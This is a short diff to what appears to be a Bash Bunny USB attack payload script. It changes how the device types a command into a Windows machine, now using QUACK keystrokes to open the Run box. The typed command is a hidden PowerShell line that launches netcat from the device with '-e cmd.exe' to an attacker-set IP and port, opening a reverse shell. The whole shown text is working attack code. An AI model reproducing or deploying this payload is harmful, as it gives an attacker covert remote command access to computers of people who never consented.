@@ -61,7 +61,10 @@ fi
 LED ATTACK
 
 # Execute the powershell command in the run box with the appropriate variables
-RUN WIN "powershell -WindowStyle Hidden \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\nc.exe') -nv ${my_ip} ${my_port} -e cmd.exe\""
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\nc.exe') -nv ${my_ip} ${my_port} -e cmd.exe"
+QUACK ENTER
 
 
 # If auto_increment, then update the listener_port file
